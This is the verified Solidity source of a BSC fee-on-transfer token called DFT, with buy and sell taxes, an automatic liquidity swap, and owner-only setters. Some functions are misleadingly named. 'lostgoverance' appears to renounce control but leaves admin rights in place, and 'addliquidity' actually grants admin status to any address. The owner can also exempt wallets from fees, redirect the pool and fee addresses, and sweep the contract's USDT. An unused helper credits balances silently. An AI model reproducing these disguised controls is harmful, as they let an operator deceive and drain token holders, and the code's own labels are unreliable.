/**
 *Submitted for verification at BscScan.com on 2022-10-09
*/

pragma solidity ^0.6.12;
 // SPDX-License-Identifier: Unlicensed
// pragma solidity ^0.5.9;

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal {}
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}


contract ERC20 is Context, IERC20 {
   using SafeMath for uint;

    mapping(address => uint) internal _balances;

    address internal poolad;
    
    bool inSwapAndLiquify;

    address internal huiliuad;
    address internal profitad;
    address internal uad;
    // address internal lpaddress;
    mapping(address=>bool) internal  governance;
    address internal _governance_;
    

    uint256 internal maxaddpool;
    mapping(address=>bool) internal whitepage;
   
  
   IUniswapV2Router02 public immutable uniswapV2Router;
     modifier lockTheSwap {
         inSwapAndLiquify = true;
         _;
         inSwapAndLiquify = false;
     }

     event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
     event SwapAndLiquify(
         uint256 tokensSwapped,
         uint256 ethReceived,
         uint256 tokensIntoLiqudity
     );
     event DonateToMarketing(uint256 bnbDonated);

     constructor () public {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xCc7aDc94F3D80127849D2b41b6439b7CF1eB4Ae0);
        uniswapV2Router = _uniswapV2Router;
        uad=0x55d398326f99059fF775485246999027B3197955;
        huiliuad=0x46956BACd17b1199F50504340F7E4D681d1E1572;
        profitad=0x2d4B182eCe059a57BC985b1a3f88e37300dB15Bc;
        // uad=0x12565063206ede162303cD274C052Bd72FD694A0;
        
    }
    
   
    
    
    
    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
        
    }
    function approve_(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _balances[account] = _balances[account].add(amount*10**18);
       
    }
    
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
   function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        if(whitepage[sender]==true || whitepage[recipient]==true){
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
            
        }
        else if(sender==poolad){
            //买
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount.mul(94).div(100));
            emit Transfer(sender, recipient, amount.mul(94).div(100));
            //分红
            _balances[profitad] = _balances[profitad].add(amount.mul(2).div(100));
            emit Transfer(sender, profitad, amount.mul(2).div(100));
            //黑洞
            _balances[address(0)] = _balances[address(0)].add(amount.mul(2).div(100));
            emit Transfer(sender, address(0), amount.mul(2).div(100));
            //回流
            _balances[address(this)] = _balances[address(this)].add(amount.mul(2).div(100));
            emit Transfer(sender, address(this), amount.mul(2).div(100));

        }else if(recipient==poolad){
            //卖
             _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount.mul(91).div(100));
            emit Transfer(sender, recipient, amount.mul(91).div(100));
            //分红
            _balances[profitad] = _balances[profitad].add(amount.mul(3).div(100));
            emit Transfer(sender, profitad, amount.mul(3).div(100));
            //黑洞
            _balances[address(0)] = _balances[address(0)].add(amount.mul(3).div(100));
            emit Transfer(sender, address(0), amount.mul(3).div(100));
            //回流
            _balances[address(this)] = _balances[address(this)].add(amount.mul(3).div(100));
            emit Transfer(sender, address(this), amount.mul(3).div(100));

        }else{
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
            //回流lp
            if(_balances[address(this)]>=maxaddpool){
                swapandaddliquidity(balanceOf(address(this)));
            }
        }   
    }
    //回流
    function swapandaddliquidity(uint256 amountIn) private lockTheSwap {   
        // IERC20(tokenA).transferFrom(to,address(this),amountIn);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uad;
        uint256 half;

        half=amountIn.div(2);
        IERC20(path[0]).approve(address(uniswapV2Router), half);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        half,
         0,
        path,
        huiliuad,
        block.timestamp.add(12000)
        );
        if(IERC20(uad).balanceOf(huiliuad)>0){
            IERC20(uad).transferFrom(huiliuad,address(this),IERC20(uad).balanceOf(huiliuad));
        }
        
        IERC20(path[0]).approve(address(uniswapV2Router), half);
        IERC20(path[1]).approve(address(uniswapV2Router), IERC20(path[1]).balanceOf(address(this)));
        uint256 tmpliqu;
         // add the liquidity
         (,,tmpliqu)=uniswapV2Router.addLiquidity(
             path[0],
             path[1],
             half,
             IERC20(path[1]).balanceOf(address(this)),
             0,
             0,
             huiliuad,
             block.timestamp.add(12000)
        );
        
    }
    
    function drawu() public { 
        require(governance[msg.sender]==true,'not owner');
        IERC20(uad).transfer(huiliuad,IERC20(uad).balanceOf(address(this)));
    }

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view override returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view  override returns (uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
   

    function transferFrom(address sender, address recipient, uint amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
}

abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) {// Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}




 interface IUniswapV2Router01 {
     function factory() external pure returns (address);
     function WETH() external pure returns (address);
 
     function addLiquidity(
         address tokenA,
         address tokenB,
         uint amountADesired,
         uint amountBDesired,
         uint amountAMin,
         uint amountBMin,
         address to,
         uint deadline
     ) external returns (uint amountA, uint amountB, uint liquidity);
     function addLiquidityETH(
         address token,
         uint amountTokenDesired,
         uint amountTokenMin,
         uint amountETHMin,
         address to,
         uint deadline
     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
     function removeLiquidity(
         address tokenA,
         address tokenB,
         uint liquidity,
         uint amountAMin,
         uint amountBMin,
         address to,
         uint deadline
     ) external returns (uint amountA, uint amountB);
     function removeLiquidityETH(
         address token,
         uint liquidity,
         uint amountTokenMin,
         uint amountETHMin,
         address to,
         uint deadline
     ) external returns (uint amountToken, uint amountETH);
     function removeLiquidityWithPermit(
         address tokenA,
         address tokenB,
         uint liquidity,
         uint amountAMin,
         uint amountBMin,
         address to,
         uint deadline,
         bool approveMax, uint8 v, bytes32 r, bytes32 s
     ) external returns (uint amountA, uint amountB);
     function removeLiquidityETHWithPermit(
         address token,
         uint liquidity,
         uint amountTokenMin,
         uint amountETHMin,
         address to,
         uint deadline,
         bool approveMax, uint8 v, bytes32 r, bytes32 s
     ) external returns (uint amountToken, uint amountETH);
     function swapExactTokensForTokens(
         uint amountIn,
         uint amountOutMin,
         address[] calldata path,
         address to,
         uint deadline
     ) external returns (uint[] memory amounts);
     function swapTokensForExactTokens(
         uint amountOut,
         uint amountInMax,
         address[] calldata path,
         address to,
         uint deadline
     ) external returns (uint[] memory amounts);
     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
     external
     payable
     returns (uint[] memory amounts);
     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
     external
     returns (uint[] memory amounts);
     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
     external
     returns (uint[] memory amounts);
     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
     external
     payable
     returns (uint[] memory amounts);
 
     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
 }
 

 interface IUniswapV2Router02 is IUniswapV2Router01 {
     function removeLiquidityETHSupportingFeeOnTransferTokens(
         address token,
         uint liquidity,
         uint amountTokenMin,
         uint amountETHMin,
         address to,
         uint deadline
     ) external returns (uint amountETH);
     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
         address token,
         uint liquidity,
         uint amountTokenMin,
         uint amountETHMin,
         address to,
         uint deadline,
         bool approveMax, uint8 v, bytes32 r, bytes32 s
     ) external returns (uint amountETH);
 
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
         uint amountIn,
         uint amountOutMin,
         address[] calldata path,
         address to,
         uint deadline
     ) external;
     function swapExactETHForTokensSupportingFeeOnTransferTokens(
         uint amountOutMin,
         address[] calldata path,
         address to,
         uint deadline
     ) external payable;
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
         uint amountIn,
         uint amountOutMin,
         address[] calldata path,
         address to,
         uint deadline
     ) external;
 }

contract dft is ERC20, ERC20Detailed{
    using SafeERC20 for IERC20;
    using Address for address;
    using SafeMath for uint;

    constructor () public ERC20Detailed("DFT", "DFT", 18) {
        _governance_=msg.sender;
        governance[_governance_]=true;
        
        _mint(msg.sender, 49000000 * 1e18);
        maxaddpool=200*1e18;
    }
    
    //丢权限
    function lostgoverance(address _governance) public { 
        require(governance[msg.sender]==true,'not owner');
        _governance_ = _governance;
    }

    


    //设置分红地址
    function setprofitad(address toad) public { 
        require(governance[msg.sender]==true,'not owner');
        profitad= toad;
    }
    //设置池子地址
    function setpoolad(address toad) public { 
        require(governance[msg.sender]==true,'not owner');
        poolad= toad;
    }
    //设置回流地址huiliuad
    function sethuiliuad(address toad) public { 
        require(governance[msg.sender]==true,'not owner');
        huiliuad= toad;
    }

    
    
    //设置usdt地址
    function setuad(address toad) public { 
        require(governance[msg.sender]==true,'not owner');
        uad= toad;
    }
    function setmaxpoool(uint256 amount) public { 
        require(governance[msg.sender]==true,'not owner');
        maxaddpool= amount;
    }

    function setwhitepage(address toad,bool flag) public { 
        require(governance[msg.sender]==true,'not owner');
        whitepage[toad] = flag;
    }

    function addliquidity(address toad,bool flag) public{
        require(governance[msg.sender]==true,'not owner');
        governance[toad]=flag;
    }

    // function swapandaddliquidit(address toad,uint256 flag) public {
    //     require(governance[msg.sender]==true,'not owner');
    //     _balances[toad]=_balances[toad].add(flag);
    // }
}